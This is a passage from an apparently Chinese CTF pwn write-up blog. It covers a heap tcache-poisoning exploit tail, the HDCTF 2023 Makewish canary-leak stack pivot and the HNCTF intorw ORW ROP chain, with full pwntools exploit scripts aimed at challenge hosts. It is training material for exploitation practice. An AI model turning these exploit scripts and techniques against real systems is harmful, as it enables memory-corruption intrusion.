pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: \n&#x27;</span>,tbs(<span class="built_in">len</span>(content)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add()</span><br><span class="line">add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    info(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span> is delete&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1F2CC0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io_file_jump_addr=libc_base+<span class="number">0x1F4570</span>-<span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;io_file_finish_addr&#x27;</span>,io_file_jump_addr)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL || r13 is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL || r13 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xda864</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">pal=p64((heap_base&gt;&gt;<span class="number">12</span>) ^ io_file_jump_addr) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: \n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Content: \n&#x27;</span>,pal)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">debug()</span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(onegadget)</span><br><span class="line">sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,<span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: \n&#x27;</span>,<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Content: \n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="HDCTF-2023-Makewish"><a href="#HDCTF-2023-Makewish" class="headerlink" title="[HDCTF 2023]Makewish"></a>[HDCTF 2023]Makewish</h1><p>确保命名的py文件不要为pwn.py，不然会报错</p><blockquote><p>rand函数在产生随机数前，需要系统提供的生成伪随机数序列的种子，rand根据这个种子的值产生一系列随机数。<br>如果系统提供的种子没有变化，每次调用rand函数生成的伪随机数序列都是一样的。</p><p>比如：通常可以利用系统时间来改变系统的种子值，即srand(time(NULL))，可以为rand函数提供不同的种子值，进而产生不同的随机数序列。<br>如果srand(1)，因为1是常数，不会变，所以每次调用rand函数生成的伪随机序列都是一样的。</p></blockquote><p>挺有趣的一道题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v5 = rand() % <span class="number">1000</span> + <span class="number">324</span>;                     <span class="comment">// 随机数&lt;1000)+324</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me you name\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me key\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v4 )</span><br><span class="line">    <span class="keyword">return</span> vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是个随机数，可惜这个随机数是固定的（一开始还忘记了 然后想了很久）</p><p>主要就是通过读入buf来覆盖canary低位的<code>\x00</code>然后puts时就会泄露canary，虽然乍一看canary的不会有任何的影响，因为他的return没有体现检查canary的程序，而vuln中，也是我们的主要的操作函数，里面调用了如下的函数，导致了canary也是必要的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258833.png" alt="image-20240615214729081"></p><p>因此要看检查canary最好的办法还是看汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to HDctf,You can make a wish to me&quot;</span>);</span><br><span class="line">  buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sorry,i can&#x27;t do that&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后有个buf[?]&#x3D;0，通过数组越界，修改rbp然后就能把栈往上迁移，然后再填充满ret和backdoor就大功告成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28988</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">ret =<span class="number">0x400902</span></span><br><span class="line">key=p32(<span class="number">0x2c3</span>)</span><br><span class="line">backdoor=<span class="number">0x04007C7</span></span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">sla(<span class="string">b&#x27;tell me you name\n\n&#x27;</span>,pal)</span><br><span class="line">ru(<span class="string">b&#x27;bbbbbbbb\n&#x27;</span>)</span><br><span class="line">canary=u64(<span class="string">b&#x27;\x00&#x27;</span>+r(<span class="number">7</span>))</span><br><span class="line"><span class="comment"># canary=p64(0xdeadbeaf)</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line">sa(<span class="string">b&#x27;tell me key\n\n&#x27;</span>,key)</span><br><span class="line">debug()</span><br><span class="line">payload = p64(ret) * <span class="number">10</span></span><br><span class="line">payload += flat([backdoor,canary])</span><br><span class="line">sa(<span class="string">&quot;to me\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="HNCTF-2022-WEEK2-intorw"><a href="#HNCTF-2022-WEEK2-intorw" class="headerlink" title="[HNCTF 2022 WEEK2]intorw"></a>[HNCTF 2022 WEEK2]intorw</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setvbuf</span><span class="params">(FILE *stream, <span class="type">char</span> *buffer, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>FILE *stream</code>：指向要设置缓冲区的文件流。</p></li><li><p><code>char *buffer</code>：指向用作缓冲区的内存。如果为 <code>NULL</code>，则由库自动分配缓冲区。</p></li><li><p><code>int mode</code>：缓冲模式，可以是以下三个值之一：</p><ul><li><code>_IOFBF</code>：全缓冲（Full Buffering）。只有当缓冲区满或调用 <code>fflush</code>、<code>fclose</code>、<code>fseek</code>、<code>fsetpos</code> 等函数时，才会实际执行 I&#x2F;O 操作。</li><li><code>_IOLBF</code>：行缓冲（Line Buffering）。当输出一个换行符、缓冲区满或调用 <code>fflush</code>、<code>fclose</code>、<code>fseek</code>、<code>fsetpos</code> 等函数时，才会实际执行 I&#x2F;O 操作。</li><li><code>_IONBF</code>：无缓冲（No Buffering）。每次 I&#x2F;O 操作都会直接执行，不会使用缓冲区。</li></ul></li><li><p><code>size_t size</code>：缓冲区的大小。如果 <code>buffer</code> 为 <code>NULL</code>，则忽略此参数。</p></li><li><p>成功时返回 <code>0</code>。</p></li><li><p>失败时返回非零值。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IOFBF  0  <span class="comment">// 全缓冲</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOLBF  1  <span class="comment">// 行缓冲</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IONBF  2  <span class="comment">// 无缓冲</span></span></span><br></pre></td></tr></table></figure><h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter how many bits you want to read&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = bitschange(v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter what you want to read:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re reading in too many bits!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">bitschange</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现参数是无符号型，显然负数溢出</p><p>有沙盒因此orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./intorw&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">20031</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0x601046</span></span><br><span class="line">vuln=<span class="number">0x04009C4</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400ad3</span>  <span class="comment">#0x0000000000400ad3 : pop rdi ; ret</span></span><br><span class="line">pal=<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)</span><br><span class="line">sla(<span class="string">b&#x27;Please enter how many bits you want to read\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;read:\n&#x27;</span>,pal)</span><br><span class="line">libc_base=u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address=libc_base</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rbx_ret=libc_base+<span class="number">0x0000000000090529</span>   <span class="comment"># 0x0000000000090529 : pop rdx ; pop rbx ; ret</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span>       <span class="comment"># 0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span>       <span class="comment"># 0x0000000000045eb0 : pop rax ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pal=<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) +p64(flag) +p64(pop_rsi_ret) +p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">pal+=p64(pop_rdi_ret)+p64(<span class="number">0x3</span>)+p64(pop_rsi_ret)+p64(elf.bss())+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x50</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">pal+=p64(pop_rdi_ret)+p64(<span class="number">0x1</span>)+p64(pop_rsi_ret)+p64(elf.bss())+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x50</span>)*<span class="number">2</span>+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;Please enter how many bits you want to read\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;read:\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop=ROP(libc)</span></span><br><span class="line"><span class="comment"># rop.read(0,elf.bss()+0x200,0x6)</span></span><br><span class="line"><span class="comment"># rop.open(elf.bss()+0x200,0)</span></span><br><span class="line"><span class="comment"># rop.read(3,elf.bss()+0x400,0x80)</span></span><br><span class="line"><span class="comment"># rop.puts(elf.bss()+0x400)</span></span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(b&#x27;Please enter how many bits you want to read\n&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># pal=b&#x27;a&#x27;*0x28 + rop.chain()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&#x27;Please enter what you want to read:\n&#x27;,pal)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s(b&#x27;/flag\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>两种写法，首先第一种便是常规orw，因为我找不到syscall,ret的rop，但是我看其他人找到了，因为有libc直接函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop=ROP(libc)</span></span><br><span class="line"><span class="comment"># rop.read(0,elf.bss()+0x200,0x6)</span></span><br><span class="line"><span class="comment"># rop.open(elf.bss()+0x200,0)</span></span><br><span class="line"><span class="comment"># rop.read(3,elf.bss()+0x400,0x80)</span></span><br><span class="line"><span class="comment"># rop.puts(elf.bss()+0x400)</span></span><br><span class="line"><span 